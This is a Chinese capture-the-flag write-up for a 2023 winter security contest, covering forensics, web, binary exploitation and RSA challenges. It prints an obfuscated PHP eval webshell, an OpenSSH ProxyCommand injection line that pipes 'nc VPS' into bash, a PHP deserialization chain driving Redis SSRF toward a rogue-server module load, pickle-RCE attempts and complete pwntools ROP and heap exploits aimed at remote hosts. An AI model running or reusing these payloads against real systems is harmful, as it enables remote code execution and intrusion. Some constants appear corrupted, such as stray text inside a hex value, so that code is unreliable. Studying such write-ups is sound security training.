# 2023年春秋杯网络安全联赛冬季赛Writeup

> 原文: https://www.ctfiot.com/158635.html
> ID: 158635

排名还行，贴个图

MISC

谁偷吃了我的外卖

下载附件得到一张图片

foremost工具进行分离，得到一个zip

然后我们可以看的压缩包内有许多 用户 XXX 的外卖的文件

我们写个脚本依照顺序往下提取_后的四个字符。

import zipfile

a = zipfile.ZipFile('wmx.zip')
x = a.namelist()
cc= []
for i in x:
    try:
        cc.append(i[11:-6])
    except:
        pass
xx = cc[5:]
with open('cc.txt','w') as w:
    w.writelines(str(xx))

kkey = ''
with open('cc.txt','r') as r:
    a = r.read()[2:-2]
a= a.split("', '")

a.sort(key=lambda x:int(x[0:-5]))  # 手动删掉文本里面的 '1_     '
# print(a)
for cx in a:
    kkey+= cx[-4:]
print(kkey)

运行后我们会得到一个 base64编码的字符，根据提示要将- 替换为 / 后进行解密

从尾部我们能够看出这是一个 zip 文件，并且通过压缩包内的提示可以知道这个zip的缺失的

我们补上文件头 50 4b 03 即可 正常解压

获得的压缩包内有于外卖箱.zip 内一样的文件，并且通过 钥匙.png 可以知道压缩软件和格式。由此可知是明文爆破

爆破一会即可点击停止，然后回获得已经解密的zip

flag就在里面

flag{W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9}

明文混淆

打开压缩包里面有一个 shell2.php 和 LICENSE.txt 文件

LICENSE.txt 文件一般为授权文件，找到几个不同的 LICENSE.txt 文件获取对应的头部进行明文爆破，最后通过 12个空格获取到了密钥，密钥为 7163444a 203b76b0 17de1387

然后提取 shell2.php 文件

源码如下，进行解混淆即可

<?php
$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};
$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};
$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};
eval($O00O0O("JE8wTzAwMD0idVNxTHlDandXcFpIaGlLbWZGR1ZUQmFOcllvSXpsZWd4Sk1iUkRVRUFrUWN0bnZzZE9QWGladnVUYWdmY0hiWFloZVdNeUtObEx3U2pvQ25ydEFCeE9RRHNKcGRrUG1JekdFVlJVRnFGSjlmd1hrZWJxYllEYVlHQVd0aWJXeFlSS3BDb1d5cmJsbzBxMnN0bzI5UGJaQkdObExHUnlRNEF0T2dzUFNlc2E5THBkc0VEeVJwVVhzZU5kVjRScDVyUjNtNHNkUkZJR0hPSTJ0bmJQdGxTS3oybEdIYkFHSE53Z3k1TlBiTk5QejROV0M1TnJMMElXU2RtcGQ5RlpJSGVaUDdua0MvRkI9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs="));
$O0O000="uSqLyCjwWpZHhiKmfFGVTBaNrYoIzlegxJMbRDUEAkQctnvsdOPXiZvuTagfcHbXYheWMyKNlLwSjoCnrtABxOQDsJpdkPmIzGEVRUFqFJ9fwXkebqbYDaYGAWtibWxYRKpCoWyrblo0q2sto29PbZBGNlLGRyQ4AtOgsPSesa9LpdsEDyRpUXseNdV4Rp5rR3m4sdRFIGHOI2tnbPtlSKz2lGHbAGHNwgy5NPbNNPz4NWC5NrL0IWSdmpd9FZIHeZP7nkC/FB==";
eval('?>'.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));
$flag = gzinflate(base64_decode('U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA=='));
echo $flag
?>

modules

OpenSSH ProxyCommand命令注入漏洞（CVE-2023-51385）

感觉像道Web题，原理

此漏洞是由于OpenSSH中的ProxyCommand命令未对%h、%p或类似的扩展标记进行正确的过滤，攻击者可通过这些值注入恶意shell字符进行命令注入攻击。

打开题目

这里我们构造gitee仓库

注意这里的模板格式，利用git push上传

编写.gitmodules内容如下

访问网站/config可获取信息，构造exp 如下

[submodule "cve"]
 path = cve
 url = ssh://`nc VPS 3333|bash|nc VPS 3334`foo.ichunqiu.com/bar

服务器开启监听3333和 3334端口，A进行命令执行，B接受即可获取Flag

WEB

ezezez_php

Redis主从复制``Pop

打开网站，源码如下

<?php
highlight_file(__FILE__);
include "function.php";
class Rd
{
    public $ending;
    public $cl;

    public $poc;

    public function __destruct()
    {
        echo "All matters have concluded"."</br>";
    }

    public function __call($name, $arg)
    {
        foreach ($arg as $key => $value) {

            if ($arg[0]['POC'] == "0.o") {
                $this->cl->var1 = "get";
            }
        }
    }
}

class Poc
{
    public $payload;

    public $fun;

    public function __set($name, $value)
    {
        $this->payload = $name;
        $this->fun = $value;
    }

    function getflag($paylaod)
    {
        echo "Have you genuinely accomplished what you set out to do?"."</br>";
        file_get_contents($paylaod);
    }
}

class Er
{
    public $symbol;
    public $Flag;

    public function __construct()
    {
        $this->symbol = True;
    }

    public function __set($name, $value)
    {   
        if (preg_match('/^(http|https|gopher|dict)?://.*(/)?.*$/',base64_decode($this->Flag))){
               $value($this->Flag);
        }
    else {
    echo "NoNoNo,please you can look hint.php"."</br>";
    }
    }

}

class Ha
{
    public $start;
    public $start1;
    public $start2;

    public function __construct()
    {
        echo $this->start1 . "__construct" . "</br>";
    }

    public function __destruct()
    {
        if ($this->start2 === "o.0") {
            $this->start1->Love($this->start);
            echo "You are Good!"."</br>";
        }
    }
}

function get($url) {
    $url=base64_decode($url);
    var_dump($url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $output = curl_exec($ch);
    $result_info = curl_getinfo($ch);
    var_dump($result_info);
    curl_close($ch);
    var_dump($output);
}

if (isset($_POST['pop'])) {
    $a = unserialize($_POST['pop']);
} else {
    die("You are Silly goose!");
}

?>

POP链子：new Ha()->start1()->new Rd()->$this->cl = new Er()->__call()赋值->$this->Flag()->构造触发SSRF请求

exp
<?php
highlight_file(__FILE__);
include "function.php";
class Rd
{
    public $ending;
    public $cl;

    public $poc;

    public function __construct(){
        $this->cl = new Er();
    }
    public function __destruct()
    {
        echo "All matters have concluded"."</br>";
    }

    public function __call($name, $arg)
    {
        foreach ($arg as $key => $value) {

            if ($arg[0]['POC'] == "0.o") {
                $this->cl->var1 = "get";
            }
        }
    }
}

class Er{
    public $symbol;
    public $Flag;

    public function __construct(){
//        $this->Flag = base64_encode('dict://127.0.0.1:6379/info');
//        $this->Flag = base64_encode('dict://127.0.0.1:6379/config:set:dir:/tmp'); //设置目录
//        $this->Flag = base64_encode('dict://127.0.0.1:6379/config:get:dir'); //获取
//        $this->Flag = base64_encode('dict://127.0.0.1:6379/config:set:dbfilename:exp.so');
//        $this->Flag = base64_encode('dict://127.0.0.1:6379/slaveof:修改为自己的VPS:2222');
//        $this->Flag = base64_encode('dict://127.0.0.1:6379/module:load:./exp.so'); //加载exp.so
        $this->Flag = base64_encode('dict://127.0.0.1:6379/system.exec:"env"'); //命令执行
    }

    public function __set($name, $value)
    {
        if (preg_match('/^(http|https|gopher|dict)?://.*(/)?.*$/',base64_decode($this->Flag))){
            $value($this->Flag);
        }
        else {
            echo "NoNoNo,please you can look hint.php"."</br>";
        }
    }

}

class Ha{
    public $start;
    public $start1;
    public $start2;

/*    public function __construct()
    {
        echo $this->start1 . "__construct" . "</br>";
    }*/

    public function __destruct()
    {
        if ($this->start2 === "o.0") {
            $this->start1->Love($this->start);
            echo "You are Good!"."</br>";
        }
    }

    public function __construct(){
        $this->start1 = new Rd();
        $this->start2 = "o.0";
        $this->start = array("POC"=>"0.o");
    }
}
//SSRF请求
/*function get($url) {
    $url=base64_decode($url);
    var_dump($url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $output = curl_exec($ch);
    $result_info = curl_getinfo($ch);
    var_dump($result_info);
    curl_close($ch);
    var_dump($output);
}*/

$a = new Ha();
echo urlencode(serialize($a));

参考项目地址：https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server

服务器运行redis_rogue_server.py监听端口

依次传参如下pop

这里构造dict://协议请求6379端口获取如下信息

依次进行运行最终加载exp.so，在环境变量env获取flag值

O%3A2%3A%22Ha%22%3A3%3A%7Bs%3A5%3A%22start%22%3Ba%3A1%3A%7Bs%3A3%3A%22POC%22%3Bs%3A3%3A%220.o%22%3B%7Ds%3A6%3A%22start1%22%3BO%3A2%3A%22Rd%22%3A3%3A%7Bs%3A6%3A%22ending%22%3BN%3Bs%3A2%3A%22cl%22%3BO%3A2%3A%22Er%22%3A2%3A%7Bs%3A6%3A%22symbol%22%3BN%3Bs%3A4%3A%22Flag%22%3Bs%3A52%3A%22ZGljdDovLzEyNy4wLjAuMTo2Mzc5L3N5c3RlbS5leGVjOiJlbnYi%22%3B%7Ds%3A3%3A%22poc%22%3BN%3B%7Ds%3A6%3A%22start2%22%3Bs%3A3%3A%22o.0%22%3B%7D

picup-未解

差一步这里，只能说有点可惜，浅写一下。这里最后的沙盒没绕过去

打开题目，给的一个登录页

这里我们可来到register.php进行注册账号

任意注册一个账号，注意观察这里是会返回一个加密数据的

登录后是一个上传接口，注意此处对内容是做检测的

艰苦寻找源码泄露ing，本来测的是文件名处任意文件读取，最后发现

功能点：/pic.php?pic=....//....//...//...//....//etc/passwd (双写可绕)

/app/app.py

import os
import pickle
import base64
import hashlib
from flask import Flask,request,session,render_template,redirect
from Users import Users
from waf import waf

users = Users()

app=Flask(__name__)
app.template_folder="./"
## secret.key值
app.secret_key=users.passwords['admin']=hashlib.md5(os.urandom(32)).hexdigest()

@app.route('/',methods=['GET','POST'])
@app.route('/index.php',methods=['GET','POST'])
def index():
    if not session or not sessiofn.get('username'):
        return redirect("login.php")
    if request.method=="POST" and 'file' in request.files and (filename:=waf.waf(request.files['file'])):
        filepath=os.path.join("./uploads",filename)
        request.files['file'].save(filepath)
        return "File upload success! Path: <a href='pic.php?pic="+filename+"'>"+filepath+"</a>."
    return render_template("index.html")

## 登录功能
@app.route('/login.php',methods=['GET','POST'])
def login():
    if request.method=="POST" and (username:=request.form.get('username')) and (password:=request.form.get('password')):
        if type(username)==str and type(password)==str and users.login(username,password):
            session['username']=username
            return "Login success! <a href='/'>Click here to redirect.</a>"
        else:
            return "Login fail!"
    return render_template("login.html")

## 注册功能
@app.route('/register.php',methods=['GET','POST'])
def register():
    if request.method=="POST" and (username:=request.form.get('username')) and (password:=request.form.get('password')):
        if type(username)==str and type(password)==str and not username.isnumeric() and users.register(username,password):
            return "Register successs! Your username is {username} with hash: {{users.passwords[{username}]}}.".format(username=username).format(users=users)
        else:
            return "Register fail!"
    return render_template("register.html")

## 文件包含
@app.route('/pic.php',methods=['GET','POST'])
def pic():
    if not session or not session.get('username'):
        return redirect("login.php")
    if (pic:=request.args.get('pic')) and os.path.isfile(filepath:="./uploads/"+pic.replace("../","")):
        if session.get('username')=="admin":
            return pickle.load(open(filepath,"rb")) ## 漏洞点
        else:
            return '''<img src="data:image/png;base64,'''+base64.b64encode(open(filepath,"rb").read()).decode()+'''">'''
    res="<h1>files in ./uploads/</h1><br>"
    for f in os.listdir("./uploads"):
        res+="<a href='pic.php?pic="+f+"'>./uploads/"+f+"</a><br>"
    return res

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

分析代码逻辑，这里我们第一步需要伪造adminsession登录/app/Users.py

import hashlib

class Users:
    passwords={}
    # def __init__(self):
    #     self.passwords
    def register(self,username,password):
        if username in self.passwords:
            return False
        if len(self.passwords)>=3:
            for u in list(self.passwords.keys()):
                if u!="admin":
                    del self.passwords[u]
        self.passwords[username]=hashlib.md5(password.encode()).hexdigest() ## 
        return True

    def login(self,username,password):
        if username in self.passwords and self.passwords[username]==hashlib.md5(password.encode()).hexdigest():
            return True
        return False
/app/waf.py
import os
from werkzeug.utils import secure_filename

def waf(file):
    if len(os.listdir("./uploads"))>=4:
        os.system("rm -rf /app/uploads/*")

    content=file.read().lower()
    if len(content)>=70:
        return False

    for b in [b"n",b"r",b"\",b"base",b"builtin",b"code",b"command",b"eval",b"exec",b"flag",b"global",b"os",b"output",b"popen",b"pty",b"repeat",b"run",b"setstate",b"spawn",b"subprocess",b"sys",b"system",b"timeit"]:
        if b in content:
            return False

    file.seek(0)
    return secure_filename(file.filename)

伪造admin用户，来到此处代码，这里是存在ppython格式化字符串漏洞

构造payload：{users.passwords} 可获取admin的password

利用这个点进行伪造session，下面就是构造pickle反序列化

测试如下

import pickle
import os

class Users(object):
    def __reduce__(self):
        cmd = ["dir"]
        # return os.execvp, (cmd[0], cmd)
        # return (os.system,('calc',))

u = Users()
payload = pickle.dumps(u)

with open('payload.pkl', 'wb') as f:
    f.write(payload)

# bypass 绕沙盒
for b in [b"n", b"r", b"\", b"base", b"builtin", b"code", b"command", b"eval", b"exec", b"flag", b"global", b"os", b"output", b"popen", b"pty", b"repeat", b"run", b"setstate", b"spawn", b"subprocess", b"sys", b"system", b"timeit"]:
    print(b.decode('utf-8'),end=' ')

# class Users(object):
#     def __reduce__(self):
#         cmd = "/flag"
#         return os.startfile, (cmd,)
#
#
# u = Users()
# payload = pickle.dumps(u)

## 构造pkl文件上传调用加载

# with open('payload.pkl', 'wb') as f:
#     f.write(payload)

大概思路就是伪造admin用户进行上传.pkl文件来到pic.php进行触发pickle反序列化。好好学一下沙盒bypass

PWN

nmanager_

先是一个类似于登录的地方，密码是由time(0)生成的字符

我们进入check的地方:

发现真正判断的地方在strcmp(a3,a4)的地方，通过前面的传递的参数，我们知道这是ch1和valid的比对，我们查看两个全局变量的位置：

发现是在我们输入的密码下面，由于没有限制我们输入密码的长度，所以我们直接覆盖ch1为valid的值即可绕过

绕过登录进入到这里，这里便是漏洞的地方，这里的n没有限制大小，所以可以使得我们实现栈内任意读写，由于是写入地址在main函数下，没有canary的保护，所以我们可以这样

我们泄露出来libc地址，并控制执行main的返回函数为start函数，然后重新执行一遍，就可以getshell

exp

from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(["./ld-linux-x86-64.so.2", name],
    #         env={"LD_PRELOAD":"./libc.so.6"})
    p = remote("8.147.131.183",16287)
    elf = ELF(name)

get_p("./nmanager")
start = 0x04011B0
payload = b"A"*(0x04041A0-0x404140) + b"check passedx00"

p.sendlineafter("input password: ",payload)
p.sendlineafter("## select the idx you want modify ##",str(8))
payload = b"A"*8 + p64(start)
p.sendafter("gender:",payload)
p.sendlineafter("age: ",str(3))
payload = b"A"*0x30
p.sendafter("name: ",payload)
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x264040
print(hex(libc.address))

p.sendafter("quit now?(Y/y)","Y")

p.sendlineafter("input password: ","A")
# gdb.attach(p,"b *0x0000040157F")
# sleep(2)
p.sendlineafter("## select the idx you want modify ##",str(8))
pop_rdi = 0x000000000002a3e5 + libc.address
ret = 0x000000000002a3e6 + libc.address
add_rsp = 0x0000000000129dcb + libc.address
system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))
payload = b"A"*8 + p64(add_rsp)
p.sendafter("gender:",payload)
p.sendlineafter("age: ",str(3))
payload = p64(ret)*5 + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendafter("name: ",payload)
p.sendafter("quit now?(Y/y)","Y")

p.interactive()

book

标准的菜单题，漏洞是delete函数由UAF，我这里是用申请到environ，泄露出来栈地址，然后实现ROP来成功的，不过值得注意的是，这里用FSOP应该会好一些，因为我们写入的大小只能是0x18，因为我们写入的函数是fgets，如果不是写入大小刚刚好就会记录下”n”

exp

from importlib.resources import contents
from pwn import*
context(arch='amd64', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(["./ld-linux-x86-64.so.2", name],
    #         env={"LD_PRELOAD":"./libc.so.6"})
    p = remote("8.147.135.190",32577)
    elf = ELF(name)

def add(idx,size):
    p.sendlineafter(">","1")
    p.sendlineafter("Index:",str(idx))
    p.sendlineafter("what size :",str(size))

def dele(idx):
    p.sendlineafter(">","2")
    p.sendlineafter("Index:",str(idx))    

def show(idx):
    p.sendlineafter(">","3")
    p.sendlineafter("Index:",str(idx))       

def edit(idx,content):
    p.sendlineafter(">","4")
    p.sendlineafter("Index:",str(idx)) 
    p.sendafter("content: ",content)
    
get_p("./pwn")
add(0,0x450)
add(1,0x8)
add(2,0x7)
add(6,0x10)
add(8,0x10)
dele(0)
show(0)
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(8,b"x00")) - 0x219ce0
print(hex(libc.address))
add(0,0x450)

dele(1)
show(1)
heap_base = u64(p.recv(5).ljust(0x8,b"x00")) * 0x1000
print(hex(heap_base))
dele(2)

environ = libc.sym['environ']
print(hex(environ))

edit(2,p64(environ^((heap_base+0x720)>>12))[:6])
add(4,0x7)
add(5,0x7)
show(5)
stack = u64(p.recvuntil("x7f")[-6:].ljust(8,b"x00")) - 0x168

dele(6)
dele(4)
edit(4,p64(stack-0x30^((heap_base+0x720)>>12))[:6])

pop_rdi = 0x000000000002a3e5 + libc.address
ret = 0x000000000002a3e6 + libc.address
system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh"))
leave_ret = 0x000000000004da83 + libc.address
pop_rsp = 0x0000000000035732 + libc.address
add_rsp = 0x0000000000149c9c + libc.address
payload = p64(pop_rdi) + p64(binsh) + p64(system) + b"n" 

add(7,0x7)

add(7,0x10)

print(hex(stack))

dele(8)

dele(4)

edit(4,p64(stack+0x1f0^((heap_base+0x720)>>12))[:6])
add(3,0x8)
add(3,0x18)
add(6,0x460)
edit(6,b"x00"*0x300 +payload)
edit(3,b"A"*8+p64(pop_rsp)+p64(heap_base+0xa80)[:7])
# gdb.attach(p,"")
# sleep(2)
edit(7,b"B"*8+p64(add_rsp)[:7])

p.interactive()

Crypto

CF is Crypto Faker

hint: 题目内容：学过AI的都知道，这题不是“纯密码”，密码假面人要披上AI的战衣，但他永远不会卸下密码的假面。

可能是非预期解了，简单RSA解密

exp如下

from Crypto.Util.number import long_to_bytes, inverse
import initialize
import train
import valid
import test
import rec
# from secret import message, flag_point
"""
flag = b"flag{" + long_to_bytes(message) + long_to_bytes(flag_point) + b".}"

p = getPrime(512)
q = getPrime(512)
n = p * q
print("The significant parameter n: %s" % hex(n))
phi0 = (p - 1) * (q - 1)
r = rec.rec(p, q)
print("The unique parameter r: %s" % hex(r))

parameters = initialize.initialize(p, q)
wild_phi = parameters[0]
wild_e = parameters[1]
print("------")

print("Parameters are initialized to: n  phi:%sn" % hex(wild_phi), " e:%s" % hex(wild_e))
print("But they are wild and crazy!")
print("We have to give them a lesson!")
print("------")

parameters = train.train(wild_phi, wild_e, n, r, phi0)
trained_phi = parameters[0]
trained_e = parameters[1]
print("Parameters are trained to: n  phi:%sn" % hex(trained_phi), " e:%s" % hex(trained_e))
print("After training, the two naughty parameters are more and more normal.")
print("It's closer to your target!")
print("------")

parameters = valid.valid(trained_phi, trained_e, n)
y_valid = parameters[0]
print("The encrypted output in validation set is %s" % hex(y_valid))
print("After validation, the model is more and more stable.")
print("To test the real flag!")
print("------")"""

# parameters = test.test(trained_phi, trained_e, n)
# y_hat_cipher1 = parameters[0]
# y_hat_cipher2 = parameters[1]
# print("The final output is n%s" % hex(y_hat_cipher1), "n%s" % hex(y_hat_cipher2))
# print("------")

# The significant parameter n: 0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3d2698476b6dd203811b6a2ec6a6e2a7e213ab719bcd3ab49bb864b10e9c78ea3f501c0e2213dfe431043bb6f0cc2e8d77bfb43869b843af1a99ae81b87811e101
# The unique parameter r: 0x4f37fe985d13ffde9867fa0063f68dea79196408b1404eadf03ea59297d629c2183a4a6a6647b6c4c99dd43bae8c4fa4691a608d20170fd42b18aef7efb3ae01cd3
# ------
# Parameters are initialized to:
#   phi:0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709648d78eb17edb46dda768a97d57e6bd1c48657393b7c0d9c574c38cc0a3545ce7d209ade33b8ac6b31a41fe9f4ed62b4ddd7b99859b74915f2031dd2f5f0499a2f8
#   e:0x2ebad696da6dda845bf03fdf34ee73d4849800de9267a5baa3c068e2d33a74727d00002fbfea775e5233087a9039d267130aa924a4f7fed3576f6ff7b8e1b2e8
# But they are wild and crazy!
# We have to give them a lesson!
# ------
# The loss is -0x5144bdad7cc24f5348c5752dda0ff5fa7d72e36370d5af55eb6f590ac0764b843a06ee1a4651b8f3a6c878df56f1678454e58eaf0ede9a1eb0503dce6a1303b69e33bbaad112abb051a28d51a9fee629e89400a338bd02998568d044852f11e05572fc4a0ddacdf7342048295a4025394e77e973621a77ea5bbdb06af2cb72b2f8298e2cd16736454fd066d3d96a4f77cd094cd783ead17024de981df7ade84aa8c282b1ec6f8ec6ec4752727387ef637ba2a4eed8f83c77d5db14d297de8098
# Parameters are trained to:
#   phi:0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3bb712fdcba325655f111918472d4353a66854ccda50b63a1047278c15a4b39cde898d054db87092958c7c05f8fa566dcd969b1ff4b7d1935c375a4af3bfc341b0
#   e:0x2c22193ad9abcca2f67552fc76dd07b3ef883f3d755c95119cdf82bb6a07c970fd37e582bb49250d8efaa29b8a59c82059165c654206a9d7261f6b45a90dc69
# After training, the two naughty parameters are more and more normal.
# It's closer to your target!
# ------
# The encrypted output in validation set is 0x775cbee546e7579f0a69645b59f72f5c8ff0c538dd9a6e755969dee2ffb8748073c089557801dfb8bfae15baba9a909f3addac142ad928ac7cc453c72166dda235128de12965df4308997416e054ab1ab9af55c60533c7374096aa2d05339900b3e14f7148930bf083eb1eb9fa22b9a997f85b39501d3a9bdfa08e3389b8f2fe
# After validation, the model is more and more stable.
# To test the real flag!
# ------
# The final output is
# 0x29289e3d9275147b885b5061637564cbee3e4d9f48e52694e594f020e49da9b24d9246b2437fb2221fa86ca1a277f3fdd7ab5cad4738a02b66d47703ef816844a84c6c209c8251e8961c9ba2c791649e022627f86932d9700c3b1dc086e8b2747d0a5604955387a935464d3866dd4100b2f3d57603c728761d1d8ef7fdbdcbee
# 0x2b0059f88454e0e36269c809b5d5b6b28e5bab3c87b20f9e55635239331100a0a582241e7a385034698b61ebf24b519e868617ff67974cc907cc61be38755737f9a6dbeb7890ff55550b1af1ecf635112fcaaa8b07a3972b3c6728cbcf2a3973a4d7bd92affec7e065e0ae83cd36858e6d983785a3668a8b82709d78a69796af
# ------

n = 0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3d2698476b6dd203811b6a2ec6a6e2a7e213ab719bcd3ab49bb864b10e9c78ea3f501c0e2213dfe431043bb6f0cc2e8d77bfb43869b843af1a99ae81b87811e101
phi = 0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3bb712fdcba325655f111918472d4353a66854ccda50b63a1047278c15a4b39cde898d054db87092958c7c05f8fa566dcd969b1ff4b7d1935c375a4af3bfc341b0
e = 0x2c22193ad9abcca2f67552fc76dd07b3ef883f3d755c95119cdf82bb6a07c970fd37e582bb49250d8efaa29b8a59c82059165c654206a9d7261f6b45a90dc69
d = inverse(e, phi)
c1 = 0x29289e3d9275147b885b5061637564cbee3e4d9f48e52694e594f020e49da9b24d9246b2437fb2221fa86ca1a277f3fdd7ab5cad4738a02b66d47703ef816844a84c6c209c8251e896Crypto1c9ba2c791649e022627f86932d9700c3b1dc086e8b2747d0a5604955387a935464d3866dd4100b2f3d57603c728761d1d8ef7fdbdcbee
c2 = 0x2b0059f88454e0e36269c809b5d5b6b28e5bab3c87b20f9e55635239331100a0a582241e7a385034698b61ebf24b519e868617ff67974cc907cc61be38755737f9a6dbeb7890ff55550b1af1ecf635112fcaaa8b07a3972b3c6728cbcf2a3973a4d7bd92affec7e065e0ae83cd36858e6d983785a3668a8b82709d78a69796af
print(d)
m1 = pow(c1, d, n)
m2 = pow(c2, d, n)
decoded_message = long_to_bytes(m1) + long_to_bytes(m2)

flag = b"flag{" + decoded_message + b".}"
print(flag)

获取flag：flag{With the method of machine learning, it is available for Crypto-er to develop the modern cryptography.Don’t give up learning crypto.}

not_wiener

下载附件得到题目源码 task.py

from Crypto.Util.number import *
from gmpy2 import *
import random, os
from hashlib import sha1
from random import randrange
flag=b''
x = bytes_to_long(flag)

def gen_key():
    while True:
        q = getPrime(160)
        p = 2 * getPrime(1024-160) * q+1
        if isPrime(p):
            break
    h = random.randint(1, p - 1)
    g = powmod(h,(p-1)//q, p)
    y=pow(g,x,p)
    return p,q,g,y
def cry():
    a =
    p = getPrime(512)
    q = getPrime(512)
    d = getPrime(280)
    n = p * q
    e = inverse(d, (p - 1) * (q - 1))
    c = pow(a, e, n)
    return n,e,c

p,q,g,y=gen_key()
k1 = random.randint(1, q-1)
h1 = bytes_to_long(sha1(os.urandom(20)).digest())
r1 = pow(g, k1, p) % q
s1 = ((h1 + x*r1) * invert(k1, q))% q

n,e,c= cry()

a=
b= 17474742587088593627
k2 = a*k1 + b
h2 = bytes_to_long(sha1(os.urandom(20)).digest())
r2 = pow(g, k2, p) % q
s2 = ((h2 + x*r2) * invert(k2, q)) % q
print(n,e,c)
print(p,q,g,y)
print("h1:%s r1:%s s1:%s"%(h1,r1,s1))
print("h2:%s r2:%s s2:%s"%(h2,r2,s2))

##给的值如下
n = 98871082998654651904594468693622517613869880791884929588100914778964766348914919202255397776583412976785216592924335179128220634848871563960167726280836726035489482233158897362166942091133366827965811201438682117312550600943385153640907629347663140487841016782054145413246763816202055243693289693996466579973
e = 76794907644383980853714814867502708655721653834095293468287239735547303515225813724998992623067007382800348003887194379223500764768679311862929538017193078946067634221782978912767213553254272722105803768005680182504500278005295062173004098796746439445343896868825218704046110925243884449608326413259156482881
c = 13847199761503953970544410090850216804358289955503229676987212195445226107828814170983735135692611175621170777484117542057117607579344112008580933900051471041224296342157618857321522682033260246480258856376097987259016643294843196752685340912823459403703609796624411954082410762846356541101561523204985391564

p= 161310487790785086482919800040790794252181955976860261806376528825054571226885460699399582301663712128659872558133023114896223014064381772944582265101778076462675402208451386747128794418362648706087358197370036248544508513485401475977401111270352593919906650855268709958151310928767086591887892397722958234379
q= 1115861146902610160756777713087325311747309309771
g= 61073566757714587321114447684333928353300944355112378054603585955730395524359123615359185275743626350773632555967063692889668342544616165017003197599818881844811647270423070958521148291118914198811187731689123176313367399492561288350530256722898205674043032421874788802819858438796795768177550638273020791962
y= 23678147495254433946472657196764372220306841739888385605070426528738230369489739339976134564575544246606937803367113623097260181789372915552172469427842482448570540429192377881186772226796452797182435452490307834205012154495575570994963829345053331967442452842152258650027916313982835119514473311305158299360
(h1, r1, s1) = 535874494834828755542711401117152397489711233142, 117859946800380767356190121030392492081340616512, 26966646740134065096660259687229179143947213779
(h2, r2, s2) = 236574518096866758760287021848258048065293279716, 863199000523521111517835459866422731857447792677, 517924607931342012033031470185302567344725962419

思路：低指数解密，Boneh-Durfee 算法，寻找其中隐藏数问题

参考来源：https://raw.githubusercontent.com/mimoo/RSA-and-LLL-attacks/master/boneh_durfee.sage

计算得到 private key found: 1493519932573300884636712093929290985070801830526216141153447882450934993737739146621

from __future__ import print_function
import time
import sympy

debug = True

strict = False

helpful_only = True
dimension_min = 10  # stop removing if lattice reaches that dimension

# display stats on helpful vectors
def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii, ii] >= modulus:
            nothelpful += 1

    print(nothelpful, "/", BB.dimensions()[0], " vectors are not helpful")

# display matrix picture with 0 and X
def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += '0' if BB[ii, jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                a += ' '
        if BB[ii, ii] >= bound:
            a += '~'
        print(a)

# tries to remove unhelpful vectors
# we start at current = n-1 (last vector)
def remove_unhelpful(BB, monomials, bound, current):
    # end of our recursive function
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB

    # we start by checking from the end
    for ii in range(current, -1, -1):
        # if it is unhelpful:
